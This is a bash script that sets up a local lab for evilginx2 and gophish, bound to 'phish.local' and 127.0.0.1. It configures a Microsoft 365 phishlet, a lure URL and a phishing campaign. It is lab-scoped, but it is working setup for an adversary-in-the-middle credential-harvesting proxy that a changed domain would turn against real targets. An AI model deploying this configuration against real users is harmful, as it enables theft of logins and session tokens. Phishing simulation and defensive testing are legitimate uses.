#!/usr/bin/env bash
# Local lab: /etc/hosts + evilginx developer mode (self-signed certs).
# Usage: sudo bash setup-local.sh [--hosts-only|start-evilginx|setup-gophish|status|all]
set -euo pipefail

PHISH_DOMAIN="${PHISH_DOMAIN:-phish.local}"
EVILGINX_CFG="${EVILGINX_CFG:-/root/.evilginx}"
EVILGINX_PORT="${EVILGINX_PORT:-443}"
GOPHISH_ADMIN="${GOPHISH_ADMIN:-https://127.0.0.1:3333}"
GOPHISH_PASS="${GOPHISH_PASS:-change-me}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

install_hosts() {
  sed -i '/evilginx.*lab/d' /etc/hosts 2>/dev/null || true
  cat >> /etc/hosts <<EOF

# evilginx m364 lab
127.0.0.1 login.${PHISH_DOMAIN} www.${PHISH_DOMAIN} ${PHISH_DOMAIN}
EOF
  echo "[+] /etc/hosts updated for ${PHISH_DOMAIN}"
}

ensure_evilginx_config() {
  mkdir -p "${EVILGINX_CFG}"
  python3 <<PY
import json
p = "${EVILGINX_CFG}/config.json"
try:
    with open(p) as f: d = json.load(f)
except FileNotFoundError:
    d = {"blacklist": {"mode": "unauth"}, "general": {}, "lures": [], "phishlets": {}}
d["general"].update({"domain": "${PHISH_DOMAIN}", "external_ipv4": "127.0.0.1", "ipv4": "127.0.0.1",
    "https_port": int("${EVILGINX_PORT}"), "dns_port": 5353, "autocert": False})
d["phishlets"] = {"m364": {"hostname": "${PHISH_DOMAIN}", "enabled": True, "visible": True, "unauth_url": ""}}
if not d.get("lures"):
    d["lures"] = [{"path": "/nVMhumIM", "phishlet": "m364", "redirect_url": "https://www.${PHISH_DOMAIN}",
        "paused": 0, "id": "", "hostname": "", "info": "", "redirector": "", "ua_filter": "",
        "og_title": "", "og_desc": "", "og_image": "", "og_url": ""}]
with open(p, "w") as f: json.dump(d, f, indent=2)
PY
  echo "[+] evilginx config written"
}

get_lure_url() {
  EVILGINX_CFG="${EVILGINX_CFG}" EVILGINX_PORT="${EVILGINX_PORT}" python3 <<'PY'
import json, os
cfg = os.environ.get("EVILGINX_CFG", "/root/.evilginx").rstrip("/") + "/config.json"
with open(cfg) as f: d = json.load(f)
path, domain = d["lures"][0]["path"], d["general"]["domain"]
port = os.environ.get("EVILGINX_PORT", "443")
print(f"https://login.{domain}{path}" if port in ("443","") else f"https://login.{domain}:{port}{path}")
PY
}

start_evilginx() {
  if tmux has-session -t evilginx 2>/dev/null; then
    echo "[*] evilginx already in tmux (attach: tmux attach -t evilginx)"
    return
  fi
  ensure_evilginx_config
  tmux new-session -d -s evilginx "evilginx2 -developer -c ${EVILGINX_CFG}"
  sleep 2
  pgrep -x evilginx2 >/dev/null && echo "[+] evilginx started" || { echo "[!] failed"; exit 1; }
}

setup_gophish() {
  lure="$(get_lure_url)"
  GOPHISH_PASS="${GOPHISH_PASS}" EVILGINX_CFG="${EVILGINX_CFG}/config.json" EVILGINX_PORT="${EVILGINX_PORT}" \
    python3 "${SCRIPT_DIR}/gophish-setup.py" || echo "[!] gophish API setup failed — set GOPHISH_PASS in local-lab.env"
}

show_status() {
  echo "Gophish admin : ${GOPHISH_ADMIN}"
  echo "Evilginx lure : $(get_lure_url 2>/dev/null || echo not-configured)?email=victim@local.test"
  echo "Evilginx      : tmux attach -t evilginx"
}

case "${1:-all}" in
  --hosts-only) install_hosts ;;
  start-evilginx) start_evilginx ;;
  setup-gophish) setup_gophish; show_status ;;
  status) show_status ;;
  all)
    [[ "${EUID}" -eq 0 ]] || { echo "Run: sudo bash $0 --hosts-only (as root)"; exit 1; }
    install_hosts; start_evilginx; setup_gophish || true; show_status ;;
  *) echo "Usage: $0 [--hosts-only|start-evilginx|setup-gophish|status|all]" ;;
esac
